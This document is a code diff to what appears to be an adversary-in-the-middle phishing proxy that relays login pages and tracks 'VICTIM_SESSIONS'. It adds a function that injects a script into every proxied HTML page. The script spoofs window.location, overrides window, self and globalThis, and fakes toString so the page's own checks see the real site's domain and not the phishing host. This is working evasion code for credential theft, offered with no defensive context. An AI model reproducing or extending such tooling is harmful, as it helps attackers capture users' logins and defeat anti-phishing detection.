@@ -586,7 +586,7 @@ const caption =
         const cleanedBuffer = Buffer.from(html);
 
         // ---- STATIC injection (original method) ----
-        serverResponseBody = updateHTMLProxyResponse(cleanedBuffer);
+        serverResponseBody = injectDomainMask(cleanedBuffer, currentSession, VICTIM_SESSIONS);
         serverResponseBody = await compressResponseBody(serverResponseBody, encodings);
 
         if (proxyResponse.headers["content-length"]) {
@@ -1250,4 +1250,78 @@ function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
     
     decompressedResponseBodyObject.Credentials.FederationRedirectUrl = proxyRequestURL;
     return Buffer.from(JSON.stringify(decompressedResponseBodyObject));
+}
+
+function injectDomainMask(htmlBuffer, sessionId, sessions) {
+  const session = sessions[sessionId];
+  if (!session) return htmlBuffer;
+
+  const realHost = session.hostname;
+  const realProtocol = session.protocol;
+  const realOrigin = `${realProtocol}//${realHost}`;
+
+  const script = `
+    (function() {
+      // 1. Create a fake but complete location object
+      const fakeLocation = new Proxy({}, {
+        get: function(target, prop) {
+          const realValue = window.location[prop];
+          if (prop === 'hostname') return '${realHost}';
+          if (prop === 'origin') return '${realOrigin}';
+          if (prop === 'protocol') return '${realProtocol}';
+          if (prop === 'host') return '${realHost}';
+          return typeof realValue === 'function' ? realValue.bind(window.location) : realValue;
+        },
+        set: function() { return true; }
+      });
+
+      // 2. Proxy the global window object
+      const realWindow = window;
+      window = new Proxy(window, {
+        get: function(target, prop) {
+          if (prop === 'location') return fakeLocation;
+          const value = target[prop];
+          return typeof value === 'function' ? value.bind(target) : value;
+        },
+        set: function(target, prop, value) {
+          if (prop === 'location') return true;
+          target[prop] = value;
+          return true;
+        }
+      });
+
+      // 3. Also proxy global references
+      const proxyWindow = window;
+      Object.defineProperty(realWindow, 'window', { get: () => proxyWindow, configurable: false });
+      Object.defineProperty(realWindow, 'self', { get: () => proxyWindow, configurable: false });
+      Object.defineProperty(realWindow, 'globalThis', { get: () => proxyWindow, configurable: false });
+
+      // 4. Prevent toString detection
+      window.toString = function() { return '[object Window]'; };
+      delete window.hasOwnProperty && Object.setPrototypeOf(window.toString, Function.prototype);
+    })();
+  `;
+
+  const payload = `<script>${script}</script>`;
+
+  // Injection logic (same as your old updateHTMLProxyResponse)
+  const injectionMap = {
+    "<head>": `<head>${payload}`,
+    "<html>": `<html><head>${payload}</head>`,
+    "<body>": `<head>${payload}</head><body>`
+  };
+  const limit = 200;
+  for (const [tag, replacement] of Object.entries(injectionMap)) {
+    const tagBuf = Buffer.from(tag);
+    const pos = htmlBuffer.subarray(0, limit).indexOf(tagBuf);
+    if (pos !== -1) {
+      return Buffer.concat([
+        htmlBuffer.subarray(0, pos),
+        Buffer.from(replacement),
+        htmlBuffer.subarray(pos + tagBuf.length)
+      ]);
+    }
+  }
+  // Fallback: prepend
+  return Buffer.concat([Buffer.from(`<head>${payload}</head>`), htmlBuffer]);
 }
